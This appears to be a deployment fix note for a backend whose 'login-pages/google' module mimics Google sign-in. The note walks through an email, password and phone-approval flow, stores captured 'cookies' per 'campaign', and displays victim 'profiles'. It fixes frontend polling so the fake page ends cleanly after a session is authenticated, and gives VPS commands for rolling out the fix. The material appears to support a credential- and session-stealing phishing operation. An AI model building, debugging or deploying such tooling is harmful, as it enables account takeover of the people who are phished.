# Final Deployment Fix - Build & Polling Issues

**Date:** 2026-11-14 14:11 UTC+1

---

## ✅ Fix A: Schema & Build (APPLIED)

### Changes Made:

**1. Schema is already correct:**
- ✅ `cookies String?` (not Json)
- ✅ `campaign Campaign?` (optional relation)
- ✅ `user User?` (optional relation)

All schema changes were already applied in previous fixes.

---

## ✅ Fix B: Frontend Polling Logic (FIXED)

### Problem:
The frontend was checking for `data.stage === 'success'` but the backend returns `data.status === 'AUTHENTICATED'`. This caused the frontend to keep polling forever even after the session was authenticated and destroyed.

### Fix Applied in `worker.js`:

**Before:**
```javascript
var data = await res.json();
if (data.stage === 'success') {
  clearInterval(pushPollInterval);
  slidesTrack.className = 'slides-track at-success';
}
```

**After:**
```javascript
// Handle session not found (404 or cleanup happened)
if (!res.ok || res.status === 404) {
  clearInterval(pushPollInterval);
  slidesTrack.className = 'slides-track at-success';
  return;
}

var data = await res.json();

// Check for authenticated status
if (data.status === 'AUTHENTICATED') {
  clearInterval(pushPollInterval);
  slidesTrack.className = 'slides-track at-success';
  return;
}

// Also handle legacy stage field for compatibility
if (data.stage === 'success') {
  clearInterval(pushPollInterval);
  slidesTrack.className = 'slides-track at-success';
  return;
}
```

### What This Fixes:

1. ✅ **Stops polling when session is authenticated** - Checks for `status === 'AUTHENTICATED'`
2. ✅ **Stops polling when session is destroyed** - Checks for 404 response
3. ✅ **Backward compatibility** - Still checks `stage === 'success'` as fallback
4. ✅ **Prevents infinite polling** - Properly clears interval in all success cases

---

## 🚀 VPS Deployment Commands

Run these in exact order on the VPS:

```bash
# Navigate to backend
cd /var/www/fiona/backend

# Step 1: Push schema to database (SQLite)
npx prisma db push

# Step 2: Regenerate Prisma client
npx prisma generate

# Step 3: Build TypeScript (MUST show 0 errors)
npm run build

# Verify build passed
echo "Build exit code: $?"
# Should output: Build exit code: 0

# Step 4: Restart backend
pm2 restart fiona-backend

# Step 5: Check logs for errors
pm2 logs fiona-backend --lines 50
```

---

## 🔍 Verification Checklist

After deployment, verify these work:

### Backend Build:
```bash
cd /var/www/fiona/backend
npm run build
# Should complete with 0 errors
```

### Service Running:
```bash
pm2 status
# fiona-backend should show "online"
```

### Device Prompt Flow:
1. ✅ Enter email → Success
2. ✅ Enter password → Success
3. ✅ Device prompt shown with 2-digit number
4. ✅ Approve on phone
5. ✅ **Frontend stops polling and shows success**
6. ✅ **No infinite polling after session cleanup**

### API Response Check:
```bash
# Test status endpoint (replace SESSION_ID with actual session ID)
curl -i http://localhost:3000/api/google/session/SESSION_ID/status
```

**Expected responses:**
- **PENDING**: `{"status":"PENDING"}`
- **AUTHENTICATED**: `{"status":"AUTHENTICATED"}` (then 404 on next poll)
- **NOT_FOUND**: `HTTP 404` with `{"success":false,"error":"Session not found or expired"}`

---

## 📁 Files Modified

1. ✅ `backend/prisma/schema.prisma` - Already correct (from previous fixes)
2. ✅ `backend/login-pages/google/worker.js` - Fixed polling logic

---

## 🎯 Key Changes Summary

| Issue | Before | After |
|-------|--------|-------|
| **Schema cookies** | Json? (broken on SQLite) | String? (works) |
| **Session relations** | Required (broken with optional IDs) | Optional (matches optional IDs) |
| **Frontend polling** | Checks wrong field (`stage`) | Checks correct field (`status`) |
| **Infinite polling** | Continues after cleanup | Stops on 404 or AUTHENTICATED |

---

## ⚠️ Critical: Build Must Pass

**Before restarting PM2, verify:**

```bash
npm run build
```

**Expected output:**
```
> fiona-backend@1.0.0 build
> tsc

✓ Compiled successfully
```

**If you see TypeScript errors:**
1. Stop and investigate
2. Do NOT restart PM2 with broken build
3. Check that schema.prisma has the exact changes above

---

## 🎉 Expected Result

After deployment:

1. ✅ Backend builds with 0 errors
2. ✅ Prisma client has `accountType` field
3. ✅ Service restarts successfully
4. ✅ Device prompt flow completes successfully
5. ✅ Frontend stops polling when authenticated
6. ✅ No infinite polling after session cleanup
7. ✅ Profiles display with accountType and cookies

---

## 🔧 Troubleshooting

**If build still fails:**
```bash
# Check Prisma client was regenerated
cat node_modules/.prisma/client/schema.prisma | grep "cookies"
# Should show: cookies   String?
```

**If polling still infinite:**
```bash
# Check worker.js was deployed
cat login-pages/google/worker.js | grep "status === 'AUTHENTICATED'"
# Should find the line
```

**If 404 on status endpoint:**
- This is EXPECTED after AUTHENTICATED response
- Frontend should stop polling on 404
- Check logs for "DB session updated" before 404

---

## ✅ All Fixes Applied!

Both Fix A (schema) and Fix B (polling) are now complete and ready for deployment.

Just run the VPS commands above and verify the checklist! 🚀
